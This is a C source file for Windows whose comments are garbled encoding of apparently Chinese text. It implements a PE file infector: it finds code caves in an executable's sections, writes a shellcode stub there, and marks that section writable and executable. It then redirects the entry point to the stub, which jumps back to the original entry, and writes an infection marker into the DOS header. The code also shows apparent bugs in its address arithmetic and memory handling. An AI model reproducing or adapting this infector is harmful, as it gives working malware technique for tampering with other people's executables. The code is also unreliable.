#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
/*
	��PE�ļ��в�����������ֳ��÷�ʽ:
		1. ���һ������
		2. ��϶����,������пռ��в������
	�������ַ�ʽ�������֮����Ҫ����PE�ļ��в��ֹؼ��ֶ�.
	��϶����ԭ��:
		�ڵĳ����ǰ���IMAGE_OPTIONAL_HEADER�е�FileAlignment�ֶζ����,
		ʵ��ÿ���ڵĳ��Ȳ�һ���պ�������ĳ������.
		������ÿ�������֮��,��Ȼ��û���õ��Ŀռ�,����ռ�ͽз�϶.
		ֻҪȷ��Ҫд�����ĳ���,Ȼ�������������������Ƿ�������ó��ȵķ�϶�Ϳ�����.
	��ȾĿ������ļ�ʵ��:
		1. �Ѵ�����ӵ�Ŀ���ļ���
			����ÿ������Ѱ���㹻���ɲ�������ķ�϶,��������뵽�÷�϶��,
			ͬʱ�޸ĸýڵ�����,���ṩ�ýڿ�ִ��Ȩ��.Ĭ��ֻ�д�����п�ִ��Ȩ��.
		2. �Ѵ�����ӵ���Ŀ���ļ���,������Щ��β��ܱ�ִ����?
			���Ҫ�޸�Ŀ���ִ���ļ�����ڵ�ַ.
			�޸�Ŀ����ڵ�ַ��,��������ִ���Լ��Ĵ���,Ȼ����ת��ԭ���������ڴ�����ִ��.
	��ֹ�ظ���Ⱦ:
		Ϊ�˱����ظ���ȾĿ�����,�����Ŀ�����д���Ⱦ��־,�Է�ֹ���θ�Ⱦ,����Ŀ������޷�ִ��.
		ÿ���ڶԳ�����и�Ⱦʱ��Ҫ���ж��Ƿ��и�Ⱦ��־,����и�Ⱦ��־,�򲻽��и�Ⱦ;���û�и�Ⱦ��־,����и�Ⱦ.
		PE�ļ��ṹ���зǳ��಻ʵ�õ��ֶ�,������һ�����ʵ�λ��д���Ⱦ��־.
		�˴�ѡ��д�뵽IMAGE_DOS_HEADER�е�e_cblpλ��.
		��ΪIMAGE_DOS_HEADER�г���e_magic��e_lfanew�����ֶ���,���඼��ûʲô�õ�,���Է���д��.
	offsetof(Struct,Member) �����:
		�ú��������ȡ��ĳ�ֶ��ڽṹ���е�����.����IMAG_DOS_HEADER�ṹ���е�e_cblp��˵,���ڽṹ���е�ƫ����2.
		��ôoffsetof(IMAGE_DOS_HEADER, e_cblp)���ص�ֵ����2.
*/
DWORD findSpace(int sectionIndex, LPVOID lpBase, PIMAGE_NT_HEADERS pNtHeader);
void release();
BOOL isPeFileAndGetPointer();
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature);

#define SIGNATURE 0xFF

char shellCode[] = "\x90\x90\x90\x90\xb8\x90\x90\x90\x90\xff\xe0\x00";
// �ļ����
HANDLE hFile = NULL;
// ӳ����
HANDLE hMap = NULL;
// ӳ����ͼָ��
LPVOID lpBase = NULL;
// DOSͷ
PIMAGE_DOS_HEADER pDosHeader = NULL;
// PEͷ
PIMAGE_NT_HEADERS pNtHeader = NULL;
// �ڱ�ͷ
PIMAGE_SECTION_HEADER pSectionHeaders = NULL;
// �ڱ�ͷ�ṹ��
IMAGE_SECTION_HEADER imgSection = { 0 };

void main2() {

	char filePath[MAX_PATH] = { 0 };
	printf("�����ļ�·��:\n");
	scanf("%s", filePath);

	hFile = CreateFile(filePath, 
		GENERIC_WRITE | GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
	lpBase = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);

	BOOL bResult = isPeFileAndGetPointer();
	if (bResult == TRUE)
	{
		// �ж��Ƿ��Ѿ�����Ⱦ����
		bResult = readSignature(hFile, offsetof(IMAGE_DOS_HEADER, e_cblp), SIGNATURE);
		if (bResult == TRUE)
		{
			printf("�Ѿ�����Ⱦ��,�˳���Ⱦ!\n");
		}
		else
		{
			int numberOfSection = pNtHeader->FileHeader.NumberOfSections;
			/* 
				����ѭ���������нڱ�,���ڴ�����뵽�����û��ִ��Ȩ��.
				������Ҫ�ֶ����ýڵ���������Ϊ0xE0000060(�ɶ�,��д,��ִ��,��������,������ʼ������)
			*/
			for (int i = 0; i < numberOfSection; i++)
			{
				// ���ڲ������ķ�϶��ַ
				DWORD dwGapAddress = findSpace(i, lpBase, pNtHeader);
				if (dwGapAddress != 0)
				{
					// ��ԭ��ڵ�ַд�����Ĵ�����,�Ա���ת��ԭ����
					DWORD dwEp = pNtHeader->OptionalHeader.ImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;
					*(DWORD*)&shellCode[5] = dwEp;

					// +3 ???
					memcpy((char*)dwGapAddress,shellCode,strlen(shellCode) + 3);
	
					// �����ڴ���벻һ��,��Ҫ��FOAת��ΪRVA,��ָ��Ϊ�µ���ڵ�ַ
					dwGapAddress = pSectionHeaders[i].PointerToRawData + dwGapAddress - (DWORD)(BYTE *)lpBase;
					pNtHeader->OptionalHeader.AddressOfEntryPoint = dwGapAddress;

					// д���Ⱦ��־
					BOOL flag = writeSignature(hFile, offsetof(IMAGE_DOS_HEADER, e_cblp),SIGNATURE);
					if (flag == FALSE)
					{
						printf("д���Ⱦ���ʧ��!\n");
					}
					printf("������뵽%s����!\n", pSectionHeaders[i].Name);
					printf("���޸ĸýڵ�Ȩ��Ϊ0xE0000060.\n");
					printf("ԭ��ڵ�ַFOA:%X\n", dwEp);
					printf("����ڵ�ַFOA:%X\n", dwGapAddress);
					break;
				}
			}
		}
	}
	release();
	system("pause");
}

/*
	��϶����
	�ڴ���ںͽ��������֮��Ľڵ��м�������϶,�����ķ����ǴӴ���ڵ�ĩβ��ʼ(������������ٶȿ��ܻ��һЩ).
	�ô�����ܻ��ҵ���϶,���ܻ��Ҳ���,����ڵ�����֮����Ҫ��һЩ�ж�,��Ӧ����ֲ�ͬ�����
*/
DWORD findSpace(int sectionIndex, LPVOID lpBase, PIMAGE_NT_HEADERS pNtHeader) {
	pSectionHeaders = (PIMAGE_SECTION_HEADER)
		((BYTE*)&pNtHeader->OptionalHeader + pNtHeader->FileHeader.SizeOfOptionalHeader);
	// ��ָ���Ƶ�����ڵ�ĩβ,�������ƶ�shellCode�ĳ���,�Ա��������shellCode�Ŀռ�
	DWORD dwAddress = pSectionHeaders[sectionIndex].PointerToRawData +
		pSectionHeaders[sectionIndex].SizeOfRawData - sizeof(shellCode);
	// 
	dwAddress = (DWORD)(BYTE*)lpBase + dwAddress;
	// ��ʼ��һ�οռ� 
	LPVOID lpCode = malloc(sizeof(shellCode));
	memset(lpCode, 0, sizeof(shellCode));
	// �Ӻ���ǰ�ڸýڵĶ���ռ��з���������϶��ַ(���ڸý���Ѱ��һƬָ��������Ϊ0�Ŀ���ռ�),ֱ���ý��е����ݿռ�.
	DWORD endAddress = (DWORD)(BYTE*)lpBase + pSectionHeaders[sectionIndex].PointerToRawData 
		+ pSectionHeaders[sectionIndex].Misc.VirtualSize;
	while (dwAddress > endAddress)
	{
		int nResult = memcmp((LPVOID)dwAddress, lpCode, sizeof(shellCode));
		if (nResult == 0)
		{
			// ���øýڵ�����Ϊ0xE0000060,��ӵ�п�ִ��Ȩ��
			pSectionHeaders[sectionIndex].Characteristics = 0xE0000060;
			return dwAddress;
		}
		dwAddress--;
	}
	free(lpCode);
	return 0;
}

/*
	�ж��Ƿ�Ϊ��Ч��PE�ļ�
	�����Чֱ�ӷ���
	�����Ч��ѽ���PE��ʽ��صĽṹ��ָ��Ҳ�õ�
*/
BOOL isPeFileAndGetPointer() {
	BOOL bResult = FALSE;
	// �ж��Ƿ�ΪMZͷ
	pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("������DOSͷ\n");
		release();
		return bResult;
	}
	// ����IMAGE_DOS_HEADER�е�e_lfanew��ֵ�õ�PEͷ��λ��
	pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pDosHeader->e_lfanew);
	// �ж��Ƿ�ΪPE\0\0
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("������PEͷ\n");
		release();
		return bResult;
	}
	// ��ȡ�ڱ��λ��,��NT_HEADER�е�&(pNtHeader->OptionalHeader)������SizeOfOptionalHeader���ǽڱ��λ����
	// &(pNtHeader->OptionalHeader):ȡ��OptionalHeader�ڸ��ļ��е�ƫ�Ƶ�ַ
	pSectionHeaders = (PIMAGE_SECTION_HEADER)((DWORD)&(pNtHeader->OptionalHeader)
		+ pNtHeader->FileHeader.SizeOfOptionalHeader);
	bResult = TRUE;
	return bResult;
}

/*
	��ָ���ļ���ָ��λ����д���Ⱦ��־
*/
BOOL writeSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	return WriteFile(hFile, &dwSignature, sizeof(DWORD), &dwNumber, NULL);
}
/*
	��ȡָ���ļ�ָ��λ���ϵĸ�Ⱦ��־
*/
BOOL readSignature(HANDLE hFile, DWORD dwAddress, DWORD dwSignature) {
	DWORD signatureToRead = 0;
	DWORD dwNumber = 0;
	SetFilePointer(hFile, dwAddress, 0, FILE_BEGIN);
	ReadFile(hFile, &signatureToRead, sizeof(DWORD), &dwNumber, NULL);
	return signatureToRead == dwSignature;
}

void release() {
	UnmapViewOfFile(lpBase);
	CloseHandle(hMap);
	CloseHandle(hFile);
}